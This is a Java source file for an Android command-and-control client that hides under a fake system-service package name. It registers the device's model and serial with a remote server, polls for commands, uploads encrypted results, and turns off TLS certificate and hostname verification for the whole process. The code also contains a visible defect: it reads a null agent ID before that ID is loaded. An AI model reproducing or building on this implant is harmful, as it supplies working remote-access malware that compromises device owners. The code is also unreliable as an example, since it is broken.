package com.android.systemservice;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class C2Client {
    private static final String TAG = "SystemService";
    private static final String PREFS = "sys_svc_prefs";
    private static final String KEY_AGENT_ID = "agent_id";
    private static final String KEY_REGISTERED = "registered";

    private final Context ctx;
    private final String serverUrl;
    private String agentId;

    public C2Client(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.serverUrl = getServerUrl();
        loadIdentity();
        trustAllCerts();
    }

    String getAgentId() { return agentId; }

    boolean isRegistered() {
        SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        return sp.getBoolean(KEY_REGISTERED, false);
    }

    void register() throws Exception {
        JSONObject body = new JSONObject();
        body.put("agent_id", agentId);
        body.put("hostname", Build.MODEL);

        JSONObject resp = post("/api/register", body);
        if (resp.has("agent_id")) {
            agentId = resp.getString("agent_id");
            SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            sp.edit()
                    .putString(KEY_AGENT_ID, agentId)
                    .putBoolean(KEY_REGISTERED, true)
                    .apply();
        }
    }

    JSONObject fetchCommand() throws Exception {
        return get("/api/command/" + agentId);
    }

    void submitResult(String command, String encryptedPayload) throws Exception {
        JSONObject body = new JSONObject();
        body.put("command", command);
        body.put("payload", encryptedPayload);
        post("/api/result/" + agentId, body);
    }

    // ---------------------------------------------------------------- HTTP helpers

    private JSONObject get(String path) throws Exception {
        URL url = new URL(serverUrl + path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(10_000);
        conn.setReadTimeout(10_000);
        int code = conn.getResponseCode();
        if (code != 200) throw new Exception("HTTP " + code);
        String body = readStream(conn);
        conn.disconnect();
        return new JSONObject(body);
    }

    private JSONObject post(String path, JSONObject payload) throws Exception {
        URL url = new URL(serverUrl + path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10_000);
        conn.setReadTimeout(10_000);
        conn.setDoOutput(true);
        byte[] data = payload.toString().getBytes(StandardCharsets.UTF_8);
        OutputStream os = conn.getOutputStream();
        os.write(data);
        os.flush();
        os.close();
        int code = conn.getResponseCode();
        String body = readStream(conn);
        conn.disconnect();
        if (code >= 400) throw new Exception("HTTP " + code + ": " + body);
        return new JSONObject(body);
    }

    private String readStream(HttpURLConnection conn) throws Exception {
        BufferedReader reader;
        try {
            reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
        } catch (Exception e) {
            reader = new BufferedReader(
                    new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8));
        }
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        reader.close();
        return sb.toString();
    }

    // ---------------------------------------------------------------- identity

    private void loadIdentity() {
        SharedPreferences sp = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        agentId = sp.getString(KEY_AGENT_ID, null);
        if (agentId == null) {
            agentId = "agent-" + Build.SERIAL + "-" + System.currentTimeMillis();
        }
    }

    private String getServerUrl() {
        int idx = agentId.indexOf('-');
        return "https://192.168.1.100:4443";
    }

    // ---------------------------------------------------------------- SSL bypass

    private void trustAllCerts() {
        try {
            TrustManager[] trustAll = new TrustManager[]{new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
            }};
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAll, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
        } catch (Exception e) {
            Log.e(TAG, "SSL bypass failed", e);
        }
    }
}
